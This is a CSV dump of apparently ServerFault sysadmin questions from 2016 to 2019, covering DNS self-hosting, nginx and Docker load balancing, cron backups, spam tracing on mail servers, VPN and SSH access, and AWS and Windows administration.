"866392","How can I point to a name server in a residential network?","<p>I am trying to run my own name servers for my domain. Currently the machines on my network are statically set to prioritize my local DNS, which works fine locally.</p>

<p>However, I'm confused about how to make my DNS work outside of my local network. Specifically, I believe that I have tell the domain registrar about my nameservers. And since the nameservers are within the domain, I have to set up glue records for the primary and secondary nameservers. But I'm on a residential network, so I only have one public IP address. How can I direct traffic to those nameservers if I cannot provide public IP addresses unique to them? When I enter my public IP and tell my router to use my local nameservers, it doesn't seem to work.</p>

<p>I'm new to this, so please let me know if I can clarify or am missing anything else. Thank you.</p>
","<domain-name-system><dns-hosting>","2017-08-02 00:31:24"
"986781","Install SSL Cert on vSphere Client 6.7","<p>I'd like to install SSL Cert on vSphere Client 6.7. I tried with Let's Encrypt using <a href=""https://jjasghar.github.io/blog/2017/11/14/vcenter-vcsa-and-using-lets-encrypt/"" rel=""nofollow noreferrer"">this method</a>, but I can't add a DNS record. I can't use preferred-challenges=http with Certbot either because the server is not internet-facing.</p>

<p>So my question:
Is there another way to get a public key or is self-signed the only way to go?</p>

<p>Thanks!</p>
","<ssl-certificate><certbot><vsphere-client>","2019-10-04 12:39:52"
"774529","Simulate massive network traffic","<p>We want to stress test our pfsense box with a massive amount of connections and traffic. Right now we are using iperf, but reaching a number of more than ~300 parallel connections the test clients reach their limit regarding open tcp connections. But we need to simulate ~4000 clients running at least one TCP connection per client. What would be the best practice?</p>
","<linux><networking><linux-networking><pfsense><stress-testing>","2016-05-03 12:57:46"
"774584","Using chkconfig to implement auto-start on RHEL7?","<p>I'm moving an in-house application from RHEL6 to RHEL7 servers.</p>

<p>I read you should still be able to use 
<code>chkconfig</code> and <code>service</code> commands to install start/stop scripts, even if they have now changed to <strong>systemd</strong> boot-up:</p>

<blockquote>
  <p>Although you can still use the service and chkconfig commands to
  start/stop and enable/disable services, respectively, they are not
  100% compatible with the RHEL 7 systemctl command ... ( <a href=""https://access.redhat.com/articles/754933"" rel=""nofollow noreferrer"">https://access.redhat.com/articles/754933</a> )</p>
</blockquote>

<p>I follow the RHEL6 procedure (<code>chkconfig --add myscript; chkconfig myscript on</code>) and get it working, so you can manually do:</p>

<pre><code>  sudo service myscript start
  sudo service myscript stop
</code></pre>

<p>This works fine.</p>

<p>But what is <strong>not</strong> working is that the application should <strong>auto-start</strong> when you reboot the Linux-server. The start-script never gets invoked after <code>reboot</code>.</p>

<p>Is this one of the ""incompatibilities"" under RHEL7?
Or is there a way to fix this, too?</p>

<p>Not able to figure this out....
we still have a mix of RHEL6 and RHEL7 servers, so would prefer if I can continue the <code>chkconfig</code> solution, for now.</p>
","<linux><redhat><systemd><rhel7><chkconfig>","2016-05-03 15:51:11"
"866526","Remove license from unavailable/down/deleted ESXi host","<p>I need to remove/unassign a paid license from an ESXi host (6.5) that is not anymore used.</p>

<p>As this host became unresponsive, the hosting company removed it completely, and <strong>I cannot access to the ESXi host anymore</strong> to ""safely and correctly"" removing the license, and put back a demo license.</p>

<p>How can I remove this unused licensed from this unavailable/down/deleted ESXi host, if this host is <strong>shut down/gone forever</strong> ?</p>

<p>Thank you</p>
","<vmware-esxi><vmware-vsphere><vsphere-client>","2017-08-02 17:44:20"
"986908","Debugging a basic nginx upstream issue","<p>people of serverfault. 
Started dabbling in docker with nginx and nodejs, and I'm having a bit of trouble figuring out how to debug my issue here. I'm running 3x nodejs containers and 1x nginx load balancer in front of them.</p>

<p>I can spin up the docker-compose successfully with docker-compose up, but when accessing localhost:8080 I get an nginx 502 with the following error in the console, repeated 3 times (for each node backend):</p>

<pre><code>loadbalancer_1  | 2019/10/05 11:40:31 [error] 6#6: *1 connect() failed (111: Connection refused) while connecting to upstream, client: MY_CLIENT_IP, server: localhost, request: ""GET / HTTP/1.1"", upstream: ""http://172.19.0.4:3000/"", host: ""MY_PUBLIC_IP:8080""
</code></pre>

<p>This is my folder structure:</p>

<pre><code>├── backend
│   ├── Dockerfile
│   └── src
│       ├── index.js
│       └── package-lock.json
├── docker-compose.yml
└── load-balancer
    ├── Dockerfile
    └── nginx.conf
</code></pre>

<p>./docker-compose.yml</p>

<pre><code>version: '3.2'
services:
  backend1:
      build: ./backend
      tty: true
      volumes:
        - './backend/src:/backend-dir-inside-container'

  backend2:
      build: ./backend
      tty: true
      volumes:
        - './backend/src:/backend-dir-inside-container'

  backend3:
      build: ./backend
      tty: true
      volumes:
        - './backend/src:/backend-dir-inside-container'

  loadbalancer:
      build: ./load-balancer
      tty: true
      links:
          - backend1
          - backend2
          - backend3
      ports:
          - '8080:8080'

volumes:
  backend:
</code></pre>

<p>./backend/Dockerfile</p>

<pre><code>FROM node:boron
LABEL Joe Programmer
RUN mkdir -p /backend-dir-inside-container
WORKDIR /backend-dir-inside-container

FROM node:boron
LABEL Joe Programmer
RUN mkdir -p /backend-dir-inside-container
WORKDIR /backend-dir-inside-container
EXPOSE 3000
</code></pre>

<p>./loadbalancer/Dockerfile</p>

<pre><code>FROM nginx
LABEL Joe Programmer
COPY nginx.conf /etc/nginx/nginx.conf

EXPOSE 8080
CMD [""nginx"", ""-g"", ""daemon off;""]
</code></pre>

<p>And this is my ./loadbalancer/nginx.conf</p>

<pre><code>events { worker_connections 1024; }

http {

 upstream localhost {
    server backend1:3000;
    server backend2:3000;
    server backend3:3000;
 }

 server {
    listen 8080;
    server_name localhost;

    location / {
       proxy_pass http://localhost;
       proxy_set_header Host $host;
    }
  }
}
</code></pre>

<p>Besides fixing this issue I'm looking to learn what exactly I'm doing wrong here. Thank you for any or all responses.</p>
","<nginx><docker><ubuntu-18.04><docker-compose>","2019-10-05 17:54:07"
"866550","Got an Abuse email for spam from my server, but postfix logs don't show them","<p>We have a server with 300+ websites on it, and it has gotten an abuse letter from spamcop. We have investigated the logs, and searched for the PHPMailer version stated in the mail and all came up with nothing.</p>

<p>I was wondering if there is a chance for some sort of phpmailer script that is obfuscated or encoded, and how to find it. I am running NeoPi and Web Shell Detector, but so far nothing comes up.</p>

<p>Is there a way to monitor the outgoing port 25 and filter it with the domain name?
The domain which the emails are supposed to be coming from is clean, I am suspecting that another code is using this domain because of its DKIM,SPIF etc.</p>

<pre><code>Return-Path: &lt;dianne.l@*****.com&gt;
X-Original-To: x
Delivered-To: x
Received: by truhi.net (Postfix, from userid 132)
    id 5BB8510057D; Sat, 29 Jul 2017 11:35:05 +0300 (EEST)
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on truhi.net
X-Spam-Level: 
X-Spam-Status: No, score=0.0 required=3.1 tests=HTML_MESSAGE autolearn=ham
    autolearn_force=no version=3.4.1
Received-SPF: None (mailfrom) identity=mailfrom; client-ip=**.**.**.***; helo=a.**.com; envelope-from=dianne.l@*****.com; receiver=&lt;UNKNOWN&gt; 
X-Greylist: delayed 319 seconds by postgrey-1.36 at truhi; Sat, 29 Jul 2017 11:35:04 EEST
Received: from a.**.com (mail.**.com [**.**.**.***])
    by truhi.net (Postfix) with ESMTP id 0D6C4100164
    for &lt;x&gt;; Sat, 29 Jul 2017 11:35:02 +0300 (EEST)
Received: by a.**.com (Postfix, from userid 33)
    id 3075E922488; Sat, 29 Jul 2017 11:29:35 +0300 (IDT)
To: x
Subject: Enter our club as a lover
Date: Sat, 29 Jul 2017 11:29:35 +0300
From: ""Dianne L."" &lt;dianne.l@*****.com&gt;
Message-ID: &lt;7fee________________________c316@www.*****.com&gt;
X-Mailer: PHPMailer 5.2.23 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: multipart/alternative;
    boundary=""b1_7feee464828bc148486a4b82f280c316""
Content-Transfer-Encoding: 8bit
</code></pre>
","<linux><postfix><smtp><email-server><spam>","2017-08-02 19:59:15"
"986923","Failed connections from AT&T cellular to Google Cloud Functions","<p>For the last 48h or so, we have had users on AT&amp;T cellular in the US reporting connectivity issues with our mobile Firebase application. We've narrowed the problem down to Cloud Functions: users on AT&amp;T cellular cannot connect to our Cloud Functions endpoints. They can connect just fine when using a WiFi network.</p>

<p>We have asked some users to run traceroutes to our endpoint from their devices, and the hops are oddly going through the European Union, with some significant (>20%) loss on the last hop.</p>

<p>I'm hoping others can confirm what we're seeing. Is anyone else experiencing this problem?</p>
","<google-cloud-platform><firebase>","2019-10-05 21:46:53"
"866592","How to speed up updating IP address in DNS?","<p>I have a website on VPS. I pretty often move it to another hosting and thus its IP address changes. I have a reason to do so. It has nothing to do with blacklisting or the like.</p>

<p>My question: how can I get it to become accessible as quickly as possible after I've moved it? I mean, the DNS-related stuff, namely how can I speed up updating its IP address or whatever needed?</p>

<p>Note that I don't want to use any paid third-party service. Building some kind of proxy by myself will be acceptable, though.</p>
","<domain-name-system><proxy><domain><ip>","2017-08-03 03:10:10"
"944113","AWS MySQL backup cron not running","<p>I have this cron:</p>

<pre><code>00 0 * * * root /home/bitnami/backup.sh &gt; /home/bitnami/backup.log
</code></pre>

<p>The Backup script contains:</p>

<pre><code>#!/bin/bash

cd /tmp
file=$(date +%Y-%m-%d).sql
mysqldump \
  --host localhost \
  --port 3306 \
  -u user \
  --password=""123"" \
  bitnami &gt; ${file}
if [ ""${?}"" -eq 0 ]; then
  gzip ${file}
  aws --region us-west-2 s3 cp ${file}.gz s3://backups/fc-wiki/
  rm ${file}.gz
else
  echo ""Error backing up mysql""
  exit 255
fi
</code></pre>

<p>Which works fine when executing it by hand (<code>sudo .\backup.sh</code>)</p>

<p>When the crontab runs it only logs the following error in backup.log:
<code>Error backing up mysql</code></p>

<p>Is there a problem how I'm setting up the cron tab with the piping to log perhaps? Even without the piping it doesn't work.</p>
","<cron>","2018-12-12 23:50:41"
"866618","Buying used Xeons from China or South Korea","<p>I'm not sure why so many of the Xeons selling on Ebay are coming from China and South Korea. Prices are extremely reasonable (delivery especially given the distance) and I'm wondering if these are safe or a known scam?</p>
","<hardware><xeon>","2017-08-03 08:09:10"
"866631","I Have configured a DNS Server and have a domain now","<p>So, I configured BIND on 2 of my servers. I have BIND fully working.
I changed my DNS on my Computer to my master server. I then visited the domain I setup. it seems to work. but once I'm not connected using my DNS it does not work. Is there some place on the internet where I have to submit my name-servers?</p>

<p>Sorry for such a noob question. I have searched the internet for hours and could not find anything.</p>

<p>I'm new at hosting my own DNS and domains.</p>
","<linux><domain-name-system><centos><domain><bind>","2017-08-03 08:52:46"
"774832","How to list ec2 instance using aws cli","<p>How can I get the list of amazon ec2 instance using aws command line tool? I checked various available commands but could not fount one suitable for this purpose.</p>
","<amazon-ec2><amazon-web-services><command-line-interface>","2016-05-04 15:37:23"
"987158","Should I use DMZ for a public NextCloud server hosted on a home network?","<p>I would like to set up a small NextCloud installation on a Raspberry Pi 1 Model B+, or something like that, on my home network.<br>I would like it to be accessible from the outside with a DNS of some sort. The idea is to create my private Dropbox.<br><br>Now regarding security... should I place the NextCloud server in DMZ and forbid everything except port 80 for nginx or Apache to serve the required HTML, or is there a better, more secure way to achieve my goal?</p>
","<firewall><dmz><nextcloud>","2019-10-08 09:32:16"
"866858","If I email something to myself on a private server, can it be intercepted?","<p>My friend is running an email service on their own private server. It's not rented in any way, they own the hardware, it is 100% self-contained. I don't really understand much about it, but along with others I have an email address there and use it for email.</p>

<p>If I log into the webmail portal and then email myself a note, is there any way it can be intercepted by an outside entity? Does my email ever leave the server into the wild web if I'm just messaging myself? Aside from a yes or no answer, I'd also like explanations if possible.</p>
","<security><email-server>","2017-08-04 11:07:31"
"945570","Can I add a Microsoft Account to my Windows Server Core? (WITHOUT domain nor domain controller)","<p>Can I use Microsoft accounts in my Windows Server Core virtual machines as we can do with Windows 10 without domain controller role or additional magic?</p>
","<windows><active-directory><user-accounts><windows-server-core>","2018-12-16 18:04:32"
"866871","Adding dns entry for subdomain in another subdomain","<p>I have a now created a subdomain - <strong>api.domain.com</strong>.
Now I want to create <strong>1.api.domain.com</strong>, <strong>2.api.domain.com</strong>.
Each pointing to different servers.
Is that possible?</p>

<p>I want to make this happen in aws route 53.</p>
","<domain-name-system><subdomain>","2017-08-04 12:22:39"
"774944","How I can look from that script runs sendmail?","<p>my problem is that some script in php or some other script or program is sending spam.</p>

<p>I am not able to trace where this program runs.</p>

<p>do the following:</p>

<pre><code>ps aux | grep sendmail
nginx    28286  0.0  0.0  39316  3328 ?        Ss   07:27   0:00 sendmail -S -t -i -fsamantha_perkins@mydomain.org
nginx    28287  0.0  0.0  39316  3352 ?        Ss   07:27   0:00 sendmail -S -t -i -fmuriel_maldonado@mydomain.org
nginx    28288  0.0  0.0  39316  3248 ?        Ss   07:27   0:00 sendmail -S -t -i -fann_owens@mydomain.org
</code></pre>

<p>I use Debian 8 and OpenSMTPD</p>
","<security><debian><spam><opensmtpd>","2016-05-05 05:38:26"
"945658","What does it mean when 24 contiguous bytes in a file are corrupted?","<p>I copied 500 MB of files from one hard drive to another and four files were found to be corrupted on the destination drive, each with one section that had 24 bytes different from the source.</p>

<p>What would cause each file to have exactly 24 bytes wrong?</p>
","<hard-drive><corruption>","2018-12-17 12:56:55"
"774997","Monitor the availability of Marathon Framework","<p>I am using Mesos - Marathon for App deployment and availability, but sometimes marathon freezes. I tried to monitor the tcp port, but during the freeze port is open and thus not able to detect the failure?</p>

<p>Any suggestions for the monitoring ?</p>
","<monitoring><system-monitoring><apache-mesos>","2016-05-05 11:22:15"
"945662","How to properly redirect all request to non-www inside nginx with reverse proxy","<p>I have a react website served by reverse proxy inside nginx. On top of that, I have SSL. Certbot is handling redirects from http to https. I would also like to setup redirects from www to non-www. I am wondering what is the correct way to do this?</p>

<p>My config looks like this:</p>

<pre><code>server {
    server_name example.com www.example.com;
    location / {
        proxy_pass http://localhost:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Proto http;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Forwarded-Host $remote_addr;
        proxy_cache_bypass $http_upgrade;
        proxy_hide_header X-Powered-By;
        add_header Strict-Transport-Security ""max-age=63072000; includeSubDomains"" always;
        add_header X-Frame-Options ""SAMEORIGIN"" always;
        add_header X-XSS-Protection ""1; mode=block"" always;
        add_header X-Content-Type-Options ""nosniff"" always;
        add_header Referrer-Policy ""origin-when-cross-origin"" always;
    }
    error_page 502 /index.html;
    location /index.html {
        root /var/www/subdomains/service;
    }

    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
}

server {
    if ($host = example.com) {
        return 301 https://$host$request_uri;
    } # managed by Certbot

    if ($host = www.example.com) {
        return 301 https://example.com$request_uri;
    }

    server_name example.com;
    listen 80;
    return 404; # managed by Certbot
}
</code></pre>

<p>Note that both of the pages (www and non-www) are currently working. I just want to avoid duplicate links, so I would only like the non-www version.</p>
","<ubuntu><nginx><ssl-certificate><configuration><reverse-proxy>","2018-12-17 13:47:16"
"945707","How to route leased IPv4?","<p>What I want to do is rent a dedicated server, install centos on it and route a /24 ipv4 to it</p>

<p>I think it's cheaper than paying for hosting,
how would I go about that ?</p>

<p>Please note that i know nothing and any small detail will help</p>
","<networking><linux-networking><ipv4>","2018-12-17 19:05:29"
"867067","Secure FTP client for Windows Explorer","<p>I have a small business website that once in awhile I need to upload files to. Before recently I've been keeping an <code>ftp</code> login string in my password manager, that looked as such:</p>

<pre><code>ftp://username:password@serverN.hostingcompany.com:port
</code></pre>

<p>I would then copy and paste it into the address bar of the Windows Explorer:</p>

<p><a href=""https://i.sstatic.net/qp3Ai.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/qp3Ai.png"" alt=""enter image description here""></a></p>

<p>that will open up files that are hosted on the web server. I can then upload, rename &amp; delete files, etc.</p>

<p>So then someone told me that sending my credentials via plain <code>ftp</code> protocol is very unsafe and suggested using <code>ftps</code> instead. Unfortunately, if I replace the protocol with <code>ftps</code> in the string above, Windows doesn't seem to know how to handle it.</p>

<p>How do you guys upload files to the web server in a secure way? Preferably something that works with Windows (and namely Windows Explorer)?</p>

<p>PS. I did my research and someone recommended using <a href=""http://www.swish-sftp.org/"" rel=""nofollow noreferrer"">Swish</a>. I tried, but the thing is so buggy that it would literally crash my Windows Explorer that would require later reboot just to get my Windows back.</p>
","<windows><ftp><sftp><ftps><windows-explorer>","2017-08-05 23:00:48"
"987594","In linux, Can a filesystem get full even though the volume is not full?","<p>In linux, Can a filesystem get full even though the volume is not full, how do we differentiate filesystem and volume in terms of storage space ?</p>
","<linux><filesystems>","2019-10-11 06:58:13"
"945812","What will happen if client call Apache server by IP and there are two SNI virtual hosts","<p>We have a Apache 2.4 web server with a couple of virtual hosts with different certificates.</p>

<p>I have  set up SNI name based virtualhosts : ap.mmm.com and ac.mmm.com, it's working great. All on same IP (172.12.12.1) and same 443 port.
The question is : what will happen if client will use IP and not server name to get to the Apache server :
I.e will use 172.12.12.1:443 instead of ap.mmm.com ?</p>
","<ssl><apache-2.4><ssl-certificate><sni>","2018-12-18 13:20:33"
"945843","Direct Access support for IoT Enterprise","<p>The company where I work has a set of kiosk devices which we install at remote sites. For the new version of these devices, we are looking at running Windows IoT Enterprise as the OS.</p>

<p>With this change, our existing MDM solution is not supported. When exploring alternative options, we came across Microsoft's Direct Access solution, which satisfies all of our requirements as far as management and cost effectiveness.</p>

<p>While Direct Access seems to be the solution we're looking for, there is one make-or-break question that I have not been able to find an answer to: <code>Is the Direct Access client supported on Windows IoT Enterprise</code>?</p>

<p>For the sake of clarity, by ""supported"" I mean ""if it breaks, can we call Microsoft Support?"" If it runs on the IoT client but is not a supported solution, we will need to look elsewhere.</p>

<p>Thank you</p>
","<windows><direct-access>","2018-12-18 15:45:18"
"775160","Minimising noise from servers","<p>I have 5 tower servers (Lenovo system x3500 m5) and they can get a bit noisy in the office.  I think it might be the fan for the power unit or cpu. We don't have access to the server room.</p>

<p>What solutions are there? </p>
","<ubuntu>","2016-05-06 02:24:39"
"987641","Machine requirement for hosting a load balancer (Nginx)","<p>We are planning to migrate an application from AWS cloud to on-prem. For our application, we were using AWS ALB. For on-prem deployment, we are planning to use an Nginx load balancer. But I'm not sure about what configuration is required for hosting the load balancer because in the cloud (AWS) we are not concerning about the machine specs. </p>

<p>What are the criteria for selecting a machine as a load balancer? I mean the RAM, CPU, etc. I'm afraid that if I choose a 4GB machine will that be enough for the load balancer? How can I choose the machine? </p>
","<nginx><load-balancing>","2019-10-11 12:24:43"
"945861","Why the kernel wasn't updated to 4.4 on Ubuntu 14.04? Other related questions","<p>I had a task to update <em>only</em> kernel to the latest version on <code>Ubuntu 14.04</code> VPS.</p>

<p>What I did:</p>

<pre><code>apt-get update
apt-get install linux-virtual
reboot
</code></pre>

<p>It updated from <code>3.13.0-24</code> to <code>3.13.0-163</code>.</p>

<p>14.04.x Ubuntu Kernel Support Schedule: <a href=""https://wiki.ubuntu.com/Kernel/Support"" rel=""nofollow noreferrer"">https://wiki.ubuntu.com/Kernel/Support</a> and <code>apt-cache search linux-generic</code> tells me that, <code>linux-image-4.4.0-98</code> exists.</p>

<h2>Questions:</h2>

<ol>
<li>Why the kernel wasn't updated to the latest <code>4.4.0-98</code> or newer version? I got <code>3.13.0-163</code> instead.</li>
<li>Is there any difference between <code>4.4</code> and <code>3.13</code> as they are both currently supported?</li>
<li>In order to update kernel to <code>4.4</code> do I need to update ubuntu to <code>14.04.5</code>?</li>
<li>How to update to <code>4.4</code> without updating the whole system?</li>
</ol>

<p>Thanks in advance.</p>
","<ubuntu-14.04><kernel><update>","2018-12-18 17:56:20"
"775191","How to Host A Single Website on Multple Windows Server with same Publice IP Address","<p>I need to host my website on multiple windows server having same static ip address so if one server</p>
","<windows-server-2008><hosting><web-hosting>","2016-05-06 07:23:25"
"867165","How do I configure mailserver SPF records under CloudFlare?","<p>For a while now I have been using Google Apps for Business to provide email services for my domain. I'm in the process of setting up a new storage server and want notification-type emails to be handled separately on the local server.</p>

<p>I've set up postfix as an internal smtp server and have that all working. However I use spf records in my dns set up to enable recipients to verify emails are coming from me. So I also need to specify that all mail received from a particular domain (in this case the fqdn of my internal mail server) is a pass.</p>

<p>The trouble is I can't see a clear way to accomplish this via CloudFlare, I saw 2 potential avenues:</p>

<ol>
<li>Specify the FQDN in the SPF record - that won't work as mail will get checked against CloudFlare's IP addresses.</li>
<li>Specify my IP address directly - that will work but it'll leave my public IP accessible for the world to see in the DNS records. This negates negates the benefit of using CloudFlare in the first place?</li>
</ol>

<p>Is there a configuration option that just verifies mail against a domain, without extended IP checks?</p>
","<domain-name-system><email-server><spf>","2017-08-06 19:52:23"
"867218","How to connect to FTP server when port 21 is blocked by my ISP?","<p>I am trying to connect to a shared hosting FTP server via port 21 but its blocked by my ISP. I'm using an internet dongle. I'm travelling and must use the dongle since there is no other wired internet or Wifi in this remote region. I contacted the host and they refuse to change the port for a single site. Port 990 is unavailable as my host offers FTPS on port 21 itself.</p>

<p>So how do I connect to an FTP server on port 21 when the port is blocked by my ISP? FTP Proxies? I have a locally setup Windows Server that I could install custom apps on. </p>
","<security><firewall><proxy><ftp><ftps>","2017-08-07 07:30:22"
"945911","How can I SSH into a server that is using a VPN?","<p>I have a Raspberry Pi server (rpi) with a static internal IP using a VPN service.  My router has a static public IP and I have the NAT set up to forward SSH traffic to the rpi as I have other devices on the network.  </p>

<p><a href=""https://i.sstatic.net/tRDOk.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/tRDOk.png"" alt=""fictitious IP numbers.""></a></p>

<p>I am able to SSH into the rpi server remotely (out of my network) when no VPN is used.  I am able to SSH into the rpi internally (in my network) when the VPN is used.  <strong>I am not able to remotely SSH into the rpi when the VPN is used.</strong></p>

<p>I have seen other questions that are similar but I'm such a novice I couldn't quite understand fully what was explained or ascertain if the situation was the same as mine.  </p>

<p>I don't believe I'm using a firewall on the server but am relying on the router to block connections and using NAT to forward connections.  I don't understand what iproute is for or on which machine it should be configured.</p>
","<ssh><vpn><external-connection>","2018-12-19 03:13:22"
"945918","How to enumerate permissions of users in active directory?","<p>I am learning AD pentesting and I am looking for a way to enumerate the user's permissions.</p>

<p>Note:- Here through permissions I am talking about those permissions which are found in the security tab.</p>

<p>So, Is there any tool or any way to enumerate what permission do have the user? I didn't find a way to enumerate, maybe there is no way.</p>
","<windows-server-2008><active-directory><permissions><access-control-list>","2018-12-19 04:18:03"
"867234","High load average, when should I be worried?","<p>I have a server which runs a few hundred processes simultaneously, most of them are idle, it is some sort of web crawler it sleeps between requests for various reasons.</p>

<p>So as a result, my load average is usually something like: 21.64, 27.05, 29.16</p>

<p>That's very very high right? But everything runs smoothly!</p>

<p>And my CPU consumption is something like (mpstat 60 1 output):</p>

<pre><code>11:07:06 AM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
11:08:06 AM  all   34.82    0.00    4.16   10.70    0.00    0.31    0.00    0.00    0.00   50.01
Average:     all   34.82    0.00    4.16   10.70    0.00    0.31    0.00    0.00    0.00   50.01
</code></pre>

<p>So, since I'm not even running at 100% CPU usage I feel like I do not have a reason to be worried, or am I missing something? There is a slight delay when nginx is serving requests, but that's expected given the large number of queued requests, But I read somewhere that a load average higher than 1 is a cause for alarm, and I honestly don't see why that is. </p>

<p>So please advise.</p>

<p>Thanks</p>
","<linux><cpu-usage><high-load><load-average>","2017-08-07 09:15:15"
"775330","Windows domain list users details where password never expires","<p>I have a Windows domain, where I need to find users with option to never expire password enabled - as a part of an audit and for contacting them. I have no rights to install any fancy Powershell parts or nothing else on the servers. I suspect adsisearcher through Powershell could probably do the trick.I also need the contact info, like email address (there are multiple addresses for many users, not sure whether that changes anything). As well there are many not real user accounts, which could unnecessarily inflate my list of users to contact.</p>
","<powershell><password><adsi>","2016-05-06 20:44:28"
"867239","Can I safely restart systemd on a live server?","<p>I'm installing a package from Digital Ocean that will monitor the server, and I'm told to run <code>systemctl daemon-reload</code> on a live server. On this server there is a running web server for a production site. Can I safely do this? I understand this restarts systemd on the machine.</p>

<p>I think I was told to do this on another server as well, and might need to do it on more. This is the message:
<code>Warning: do-agent.service changed on disk. Run 'systemctl daemon-reload' to reload units.</code></p>
","<systemd>","2017-08-07 09:30:24"
"987771","Chrony on RHEL7.2 can sync to windows ntp server, But Chrony on RHEL7.4 can't sync it","<p>according to redhat link:</p>

<pre><code>https://access.redhat.com/solutions/3425701
</code></pre>

<p>we can see that - Chrony on RHEL7.2 can sync to windows ntp server, But Chrony on RHEL7.4 can't sync it.</p>

<p>in my case we have redhat 7.5</p>

<p>how to know if the problem with chrony is the same also on redhat 7.5 or maybe already solved ?</p>
","<redhat><ntp>","2019-10-12 22:18:31"
"987783","How to add ngx_http_geoip2_module support to Nginx","<p>geoip is one of the must-have module for Nginx, in the latest Nginx package i couldn't find geoip2 support. It is showing a few dependency errors. </p>
","<nginx><geoip>","2019-10-13 08:21:15"
"867347","AWS Free Tier Instances - Running two instances parallel from two Services","<p>Can I run a EC2, t2.micro instance &amp; a RDS db.t2.micro instance, parallel &amp; continuously a whole month ? Or is it I can only run one of them ?</p>

<p>I know both of them have 750 hours of up time available in the free tier. But I'm bit confused whether it is (EC2 OR RDS) or (EC2 &amp; RDS) in the free tier.</p>
","<amazon-web-services>","2017-08-07 17:54:10"
"987950","What can LVM do that standard partition can't?","<p>I haven't spent much time dealing with standard partition. Aside from ""LVM makes it easier"" to manage disk, what really can LVM do that standard partition can't?</p>

<p>All I can think of right now is that your LV(Logical Volume) can be a combination of multiple hard disks. Can you also add size to your volume by shrinking another volume in standard partition? </p>
","<hard-drive><lvm>","2019-10-14 15:32:42"
"867501","Unbound : what capacity will i need on drive?","<p>I'm planning to set up my own dns server (for a cybercafe, 30 computers)</p>

<p>what size will unbound need on hdd after months of use ? </p>

<p>Mb, Gb, Tb ?</p>
","<unbound>","2017-08-08 13:04:01"
"775616","How works the NS record definition in DNS section at CloudFlare?","<p>In domain configuration at CloudFlare, the DNS section stores the record definitions. What is the exact purpose of NS record here? If configured, it shows something like:</p>

<pre><code>Type | Name       | Value                     | TTL
-----+------------+---------------------------+----------
NS   | domain.com | managed by ns1.domain.com | Automatic
</code></pre>

<p>But the NS at authoritative DNS server (registrar) is configured accordingly to the CloudFlare assignments:</p>

<pre><code>adi.ns.cloudflare.com
bob.ns.cloudflare.com
</code></pre>

<p>And the latter are presented if the domain is queried for example by any DNS propagation checker (e.g. whatsmydns.net).</p>

<p>The domain is being <em>managed by</em> their DNS anyway, so what's the purpose of defining the NS records in CloudFlare configuration panel?</p>
","<domain-name-system><cloudflare>","2016-05-09 10:30:48"
"988034","Server redirect requests","<p>First, I'm trying make an main-server with my database and my files, and create 1 small servers to redirect requests, for example:</p>

<p>[SMALL-SERVER] IP: 1.1.1.1<br>
[MASTER-SERVER] IP: 9.9.9.9<br>
My website: server.com<br></p>

<p><strong>server.com</strong> will point to <strong>1.1.1.1</strong> (<em>small-server</em>), and this small server will forward all requests to <strong>9.9.9.9</strong> (<em>master-server</em>), but I don't want the domain be changed, the small server will only redirect all requests to <em>master-server</em></p>

<p>e.g.: <a href=""http://server.com"" rel=""nofollow noreferrer"">http://server.com</a> => <em>small-server</em> will throw the user to master-server</p>

<p>Using nginx or apache, how can I do that? (LINUX)</p>

<p>Thank you very much.</p>
","<linux><nginx><apache2>","2019-10-15 09:05:04"
"867674","PHP 5.6 not working - Ubuntu 12.04","<p>I had <strong>PHP5.3</strong> on my ubuntu and is now trying to install <strong>PHP5.6</strong> on it.</p>

<p>After purging the current version, This is what I've done first:</p>

<ul>
<li>sudo add-apt-repository ppa:ondrej/php</li>
<li>sudo apt-get update</li>
<li>sudo apt-get install php5.6</li>
</ul>

<p>But there are no packages available in that name (checked php-5.6, php56 too, but no luck)</p>

<p>When trying the command</p>

<ul>
<li>apt-get install php5</li>
</ul>

<p>, it installs PHP, but the older version (<strong>5.3</strong>)</p>

<p>It appears the packages are not getting fetched from the PPA or something.</p>

<p>Also, I've done an apt-get clean all, and redid the above steps, but still nothing.</p>

<p>Could someone please advise?</p>
","<php><ubuntu-12.04><apt><package-management>","2017-08-09 09:28:09"
"867698","Allow FTP and Database on single IP address","<p>I am using Ubuntu 14.04 server, and i use this in the lab with local ip address (192.168.0.1) and configured with live IP too (144.12.65.2 this is a static IP)
so, i want to allow users to access the FTP and database service only from lab not from outside. Please help me.  </p>
","<mysql><ftp>","2017-08-09 11:25:49"
"867711","Microsoft office licence","<p>we bought computer from local shop with Microsoft office original. the shop send me this link to download the software and he gave me a product key.</p>

<p><a href=""http://down.microsoft-oem.com/office/en_office_professional_plus_2016_x86_x64_dvd_6962141.iso"" rel=""nofollow noreferrer"">http://down.microsoft-oem.com/office/en_office_professional_plus_2016_x86_x64_dvd_6962141.iso</a></p>

<p>i want to be sure the license of the microsoft office is original. if i have the product key does it means its original.</p>

<p>how to be sure</p>

<p>best regards</p>

<p>gbu</p>
","<microsoft-office>","2017-08-09 13:06:04"
"867735","Operation timed out Ansible AWS","<p>In etc/ansible/hosts, I have entered VPC IPv4 and tried to run command:</p>

<blockquote>
  <p>ansible all -m ping</p>
</blockquote>

<p>but got this error.</p>

<p>UNREACHABLE! => {
    ""changed"": false, 
    ""msg"": ""Failed to connect to the host via ssh: ssh: connect to host <strong><em>.</em></strong>.<strong><em>.</em></strong> port 22: Operation timed out\r\n"", 
    ""unreachable"": true
}</p>

<p>please help to solve this?</p>
","<ansible>","2017-08-09 14:16:23"
